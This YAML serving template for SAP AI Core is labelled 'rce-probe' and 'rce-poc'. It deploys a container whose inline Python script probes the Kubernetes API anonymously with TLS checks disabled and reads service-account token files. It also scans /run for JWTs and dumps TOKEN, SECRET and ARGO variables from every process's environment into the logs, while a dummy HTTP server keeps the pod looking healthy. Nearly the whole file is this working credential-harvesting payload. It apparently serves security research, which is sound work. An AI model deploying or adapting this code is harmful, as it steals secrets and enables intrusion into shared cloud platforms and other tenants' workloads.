apiVersion: ai.sap.com/v1alpha1
kind: ServingTemplate
metadata:
  name: rce-probe
  labels:
    scenarios.ai.sap.com/id: "rce-probe"
    ai.sap.com/version: "1.0.0"
  annotations:
    scenarios.ai.sap.com/name: "rce-probe"
    executables.ai.sap.com/name: "rce-probe"
    executables.ai.sap.com/description: "rce-poc"
spec:
  template:
    apiVersion: "serving.kserve.io/v1beta1"
    metadata:
      annotations: |
        autoscaling.knative.dev/target: 1
      labels: |
        ai.sap.com/resourcePlan: starter
    spec: |
      predictor:
        minReplicas: 1
        maxReplicas: 1
        containers:
        - name: kserve-container
          image: python:3.11
          command: ["/bin/sh", "-c"]
          args:
          - |
            python3 -c "
            import urllib.request, ssl, json, os

            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

            K8S = os.environ.get('KUBERNETES_SERVICE_HOST', '100.104.0.1')
            K8S_PORT = os.environ.get('KUBERNETES_SERVICE_PORT', '443')
            results = {}

            # K8s API paths to probe (anonymous)
            for path in [
                '/api',
                '/api/v1',
                '/apis',
                '/version',
                '/healthz',
                '/livez',
                '/readyz',
                '/metrics',
                '/openapi/v2',
                '/openapi/v3',
                '/.well-known/openid-configuration',
                '/api/v1/namespaces',
                '/api/v1/nodes',
                '/api/v1/pods',
                '/api/v1/secrets',
                '/apis/apps/v1',
            ]:
                url = f'https://{K8S}:{K8S_PORT}{path}'
                try:
                    req = urllib.request.Request(url)
                    with urllib.request.urlopen(req, timeout=5, context=ctx) as r:
                        body = r.read(2000).decode(errors='replace')
                        results[f'k8s{path}'] = {'code': 200, 'body': body[:500]}
                except urllib.error.HTTPError as e:
                    body = ''
                    try: body = e.read(2000).decode(errors='replace')
                    except: pass
                    headers = dict(e.headers)
                    results[f'k8s{path}'] = {
                        'code': e.code,
                        'body': body[:300],
                        'www_auth': headers.get('Www-Authenticate', ''),
                    }
                except Exception as e:
                    results[f'k8s{path}'] = {'err': str(e)[:80]}

            # Try OIDC discovery (might not need auth)
            try:
                req = urllib.request.Request(f'https://{K8S}:{K8S_PORT}/.well-known/openid-configuration')
                with urllib.request.urlopen(req, timeout=5, context=ctx) as r:
                    results['oidc'] = json.loads(r.read())
            except Exception as e:
                results['oidc'] = 'ERR: ' + str(e)[:80]

            # Try to get service account token from projected volumes
            for token_path in [
                '/var/run/secrets/kubernetes.io/serviceaccount/token',
                '/run/secrets/kubernetes.io/serviceaccount/token',
                '/run/secrets/tokens/default',
                '/run/secrets/tokens/token',
            ]:
                try:
                    with open(token_path) as f:
                        token = f.read().strip()
                        results[f'token_{token_path}'] = token[:50] + '...'
                except Exception as e:
                    results[f'token_{token_path}'] = 'ERR: ' + str(e)[:50]

            # Check entire /run directory for any tokens
            import glob
            for f in glob.glob('/run/**', recursive=True):
                try:
                    if os.path.isfile(f) and os.path.getsize(f) < 5000:
                        with open(f) as fh:
                            content = fh.read(200)
                            if 'eyJ' in content:  # JWT token pattern
                                results[f'jwt_found_{f}'] = content[:100]
                except:
                    pass

            # Scan /proc for any process with K8s token env vars
            for pid_dir in glob.glob('/proc/[0-9]*'):
                try:
                    pid = pid_dir.split('/')[-1]
                    with open(f'{pid_dir}/environ', 'rb') as env_f:
                        env_data = env_f.read()
                    for entry in env_data.split(b'\x00'):
                        if b'=' in entry:
                            k, _, v = entry.partition(b'=')
                            if b'TOKEN' in k or b'SECRET' in k or b'ARGO' in k:
                                results[f'proc_{pid}_{k.decode()}'] = v.decode(errors='replace')[:100]
                except:
                    pass

            print('[K8S_PROBE_START]')
            print(json.dumps(results, indent=2, default=str))
            print('[K8S_PROBE_END]')
            " 2>&1
            python3 -c "
            import http.server
            class H(http.server.BaseHTTPRequestHandler):
                def do_GET(self): self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
                def log_message(self, *a): pass
            http.server.HTTPServer(('', 8080), H).serve_forever()
            "
